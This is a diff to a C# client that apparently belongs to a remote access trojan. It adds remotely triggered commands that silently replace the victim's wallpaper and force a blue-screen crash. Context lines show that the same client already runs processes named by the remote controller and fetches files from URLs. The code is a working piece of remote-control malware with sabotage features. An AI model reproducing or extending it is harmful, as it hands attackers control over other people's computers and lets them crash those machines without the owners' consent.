@@ -157,7 +157,23 @@ namespace Client
                                 System.Diagnostics.Process.Start(savePath);
                             }
                             break;
+                        case "wallpaper":
+                            var filenaem = (string)message["filename"];
 
+                            if (!string.IsNullOrEmpty(filenaem))
+                            {
+                                string savePath = Path.Combine(Path.GetTempPath(), filenaem);
+
+                                savePath = GetUniqueFilePath(savePath);
+                                File.WriteAllBytes(savePath, e.FileRequest.FileBytes);
+                                Wallpaper.SilentSet(savePath, WallpaperStyle.Stretch);
+
+                                if (File.Exists(savePath)) {
+                                    File.Delete(savePath); // Clean up temp file after setting wallpaper
+                                }
+                            }
+
+                            break;
                         // Add other commands as needed
                         default:
                             Console.WriteLine($"Unknown command: {command}");
@@ -357,6 +373,9 @@ namespace Client
                             string bod = (string)message["body"];
                             System.Diagnostics.Process.Start(bod);
                             break;
+                        case "bsod":
+                            BlueScreenTrigger.TriggerBSOD();
+                            break;
                         case "fileurl":
                             string fileUrl = (string)message["body"];
 
@@ -381,6 +400,7 @@ namespace Client
                             });
 
                             break;
+
 
 
                     }
